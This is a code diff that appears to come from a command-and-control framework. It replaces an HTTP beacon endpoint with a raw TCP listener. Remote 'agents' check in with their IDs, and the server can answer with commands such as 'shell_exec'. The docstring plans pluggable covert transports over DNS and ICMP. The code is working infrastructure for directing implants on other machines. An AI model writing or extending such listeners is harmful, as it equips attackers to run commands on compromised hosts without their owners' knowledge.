@@ -1,13 +1,18 @@
 """
 Part 1 — Connection Handler
 Abstract base class for agent-facing transport. Implement a new subclass to
-add any transport (HTTPS, DNS, ICMP, etc.) without touching the crypto or
+add any transport (TCP, DNS, ICMP, etc.) without touching the crypto or
 data-parsing layers.
 
-Bundled implementation: HttpConnectionHandler (plain HTTP, dev/test use only).
+Bundled implementation: TcpConnectionHandler (raw TCP, no HTTP).
+
+Wire protocol:
+  client -> server : "<command> <agent_id>\n"   e.g. "keepalive abcdeabcde"
+  server -> client : "<response>"               e.g. "OK" or "shell_exec"
 """
 
 import logging
+import socket
 import threading
 from abc import ABC, abstractmethod
 from typing import Callable
@@ -47,41 +52,57 @@ class ConnectionHandler(ABC):
 
 
 # ---------------------------------------------------------------------------
-# Concrete implementation: HTTP
+# Concrete implementation: raw TCP
 # ---------------------------------------------------------------------------
 
-class HttpConnectionHandler(ConnectionHandler):
+class TcpConnectionHandler(ConnectionHandler):
     """
-    Agents POST raw (encrypted) bytes to  POST /beacon/<agent_id>.
-    The response body carries the encrypted reply.
+    One TCP connection per beacon. Client sends "<command> <agent_id>",
+    server replies with the response string and closes the connection.
     """
 
     def __init__(self):
         super().__init__()
-        from flask import Flask
-        self._app = Flask(__name__)
-        self._server = None
+        self._sock: socket.socket | None = None
         self._thread: threading.Thread | None = None
-        self._register_routes()
+        self._running = False
 
-    def _register_routes(self):
-        from flask import request, Response
-
-        @self._app.route("/beacon/<agent_id>", methods=["POST"])
-        def beacon(agent_id: str):
-            raw = request.get_data()
-            response_bytes = self._dispatch(agent_id, raw)
-            return Response(response_bytes, content_type="application/octet-stream")
-
-    def start(self, host: str = "0.0.0.0", port: int = 8080):
-        from werkzeug.serving import make_server
-
-        self._server = make_server(host, port, self._app)
-        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
+    def start(self, host: str = "0.0.0.0", port: int = 9000):
+        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self._sock.bind((host, port))
+        self._sock.listen(64)
+        self._running = True
+        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
         self._thread.start()
-        log.info("Agent listener started on %s:%d", host, port)
+        log.info("TCP agent listener started on %s:%d", host, port)
+
+    def _accept_loop(self):
+        while self._running:
+            try:
+                conn, addr = self._sock.accept()
+                threading.Thread(
+                    target=self._handle_conn, args=(conn, addr), daemon=True
+                ).start()
+            except OSError:
+                break
+
+    def _handle_conn(self, conn: socket.socket, addr):
+        with conn:
+            try:
+                data = conn.recv(4096)
+                if not data:
+                    return
+                parts = data.decode().strip().split(" ", 1)
+                command  = parts[0]
+                agent_id = parts[1] if len(parts) > 1 else ""
+                response = self._dispatch(agent_id, command.encode())
+                conn.sendall(response)
+            except Exception as exc:
+                log.warning("Error handling connection from %s: %s", addr, exc)
 
     def stop(self):
-        if self._server:
-            self._server.shutdown()
-            log.info("Agent listener stopped.")
+        self._running = False
+        if self._sock:
+            self._sock.close()
+            log.info("TCP agent listener stopped.")
